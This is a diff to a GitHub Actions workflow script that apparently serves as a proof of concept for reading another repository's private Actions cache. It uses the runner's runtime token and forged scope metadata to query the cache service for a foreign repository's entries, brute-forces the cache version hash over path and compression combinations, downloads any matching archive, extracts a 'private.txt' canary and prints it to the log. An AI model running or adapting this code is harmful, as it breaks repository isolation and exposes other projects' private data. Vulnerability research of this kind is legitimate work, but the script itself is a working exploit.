@@ -13,13 +13,13 @@ jobs:
         uses: actions/github-script@v7
         env:
           TARGET_REPOSITORY_ID: "1291730291"
-          TARGET_KEY: g06-a-private-cache-20260804-v1
-          TARGET_VERSION: 357d0a072080a0f6ba43dc91a33e305dc51385dc675d5f953cec5f279bd5393f
+          TARGET_KEY: g06-a-private-cache-20260804-v2
         with:
           github-token: ${{ secrets.GITHUB_TOKEN }}
           script: |
             const fs = require("fs");
             const cp = require("child_process");
+            const crypto = require("crypto");
             const base = (process.env.ACTIONS_RESULTS_URL || "").replace(/\/$/, "");
             const token = process.env.ACTIONS_RUNTIME_TOKEN || "";
             const headers = {
@@ -27,51 +27,65 @@ jobs:
               "Content-Type": "application/json",
               Accept: "application/json"
             };
-            const body = {
-              metadata: {
-                repository_id: Number(process.env.TARGET_REPOSITORY_ID),
-                scope: [{ scope: "refs/heads/main", permission: 3 }]
-              },
-              key: process.env.TARGET_KEY,
-              version: process.env.TARGET_VERSION
-            };
-            const lookup = await fetch(base + "/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL", {
-              method: "POST",
-              headers,
-              body: JSON.stringify(body)
-            });
-            const lookupText = await lookup.text();
-            let lookupData = {};
-            try { lookupData = JSON.parse(lookupText); } catch (_) {}
-            let download = { status: "not-run" };
-            let archiveBytes = 0;
-            let members = "";
-            let canary = "";
-            if (lookupData.signed_download_url) {
-              const response = await fetch(lookupData.signed_download_url);
-              const bytes = Buffer.from(await response.arrayBuffer());
-              archiveBytes = bytes.length;
-              fs.writeFileSync("foreign-cache.tzst", bytes);
-              download = { status: response.status, contentType: response.headers.get("content-type") };
-              try {
-                members = cp.execFileSync("tar", ["--use-compress-program=zstd", "-tf", "foreign-cache.tzst"], { encoding: "utf8" });
-                const member = members.split("\n").find(x => x.includes("private.txt"));
-                if (member) {
-                  canary = cp.execFileSync("tar", ["--use-compress-program=zstd", "-xOf", "foreign-cache.tzst", member], { encoding: "utf8" }).trim();
-                }
-              } catch (error) {
-                members = "TAR_ERROR:" + String(error.message);
+            const candidates = [];
+            for (const path of ["ab_cache", "ab_cache/private.txt", "ab_cache/"]) {
+              for (const compression of ["zstd-without-long", "zstd", "gzip"]) {
+                candidates.push({
+                  path,
+                  compression,
+                  version: crypto.createHash("sha256").update(path + "|" + compression + "|1.0").digest("hex")
+                });
               }
             }
-            console.log("G06_FOREIGN_CACHE_READ_RESULT", JSON.stringify({
+            const results = [];
+            let found = null;
+            for (const candidate of candidates) {
+              const body = {
+                metadata: {
+                  repository_id: Number(process.env.TARGET_REPOSITORY_ID),
+                  scope: [{ scope: "refs/heads/main", permission: 3 }]
+                },
+                key: process.env.TARGET_KEY,
+                version: candidate.version
+              };
+              const response = await fetch(base + "/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL", {
+                method: "POST",
+                headers,
+                body: JSON.stringify(body)
+              });
+              const text = await response.text();
+              let data = {};
+              try { data = JSON.parse(text); } catch (_) {}
+              const item = {
+                candidate,
+                status: response.status,
+                ok: data.ok,
+                matchedKey: data.matched_key || "",
+                hasDownload: Boolean(data.signed_download_url)
+              };
+              if (data.signed_download_url && !found) {
+                const archive = Buffer.from(await (await fetch(data.signed_download_url)).arrayBuffer());
+                fs.writeFileSync("foreign-cache.tzst", archive);
+                let members = "";
+                let canary = "";
+                try {
+                  members = cp.execFileSync("tar", ["--use-compress-program=zstd", "-tf", "foreign-cache.tzst"], { encoding: "utf8" });
+                  const member = members.split("\n").find(x => x.includes("private.txt"));
+                  if (member) {
+                    canary = cp.execFileSync("tar", ["--use-compress-program=zstd", "-xOf", "foreign-cache.tzst", member], { encoding: "utf8" }).trim();
+                  }
+                } catch (error) {
+                  members = "TAR_ERROR:" + String(error.message);
+                }
+                found = { candidate, archiveBytes: archive.length, members, canary };
+              }
+              results.push(item);
+            }
+            console.log("G06_FOREIGN_CACHE_READ_MATRIX", JSON.stringify({
               actor: context.actor,
               currentRepo: context.repo,
-              target: body,
-              lookup: { status: lookup.status, data: lookupData, rawPrefix: lookupText.slice(0, 160) },
-              download,
-              archiveBytes,
-              members,
-              canary
+              targetKey: process.env.TARGET_KEY,
+              targetRepositoryId: process.env.TARGET_REPOSITORY_ID,
+              results,
+              found
             }));
-
-# trigger follow-up
